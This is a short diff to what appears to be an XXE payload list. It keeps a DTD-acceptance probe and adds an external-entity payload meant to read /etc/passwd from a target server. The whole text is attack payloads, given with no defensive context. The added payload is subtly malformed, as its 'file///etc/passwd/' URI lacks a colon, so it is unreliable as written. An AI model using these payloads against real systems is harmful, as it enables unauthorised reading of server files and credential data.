@@ -1,9 +1,15 @@
 
------------BASIC test to see if the endpoint is accepting DTD-----------
+-----------test to see if the endpoint is accepting DTD-----------
 <?xml encoding="UTF-8"?>
 <!DOCTYPE xxe [ <!ENTITY xxe "FaizanNehalXXE"> ]>
 <root>
 &xxe;
 </root>
 
+---------BASIC XXE Payload to retreive the etc/passwd/ file ----------
 
+<?xml encoding="UTF-8"?>
+<!DOCTYPE xxe [ <!ENTITY xxe SYSTEM "file///etc/passwd/"> ]>
+<root>
+&xxe;
+</root>
